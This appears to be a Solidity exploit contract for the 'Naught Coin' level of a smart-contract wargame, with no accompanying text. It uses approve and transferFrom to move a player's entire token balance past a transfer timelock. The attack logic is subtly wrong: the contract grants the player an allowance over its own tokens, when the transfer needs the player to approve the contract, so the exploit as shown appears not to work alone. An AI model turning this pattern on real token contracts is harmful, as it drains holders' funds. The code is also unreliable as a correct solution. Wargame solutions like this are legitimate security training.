pragma solidity ^0.8.11;

import "./NaughtCoin.sol";

contract NaughtCoinAttack {
    NaughtCoin private _victim;

    constructor(address payable victim) {
        _victim = NaughtCoin(victim);
    }

    function attack(address player) external {
        uint256 amount = 1000000 * (10**uint256(_victim.decimals()));

        _victim.approve(player, amount);

        _victim.transferFrom(player, address(this), amount);
    }
}
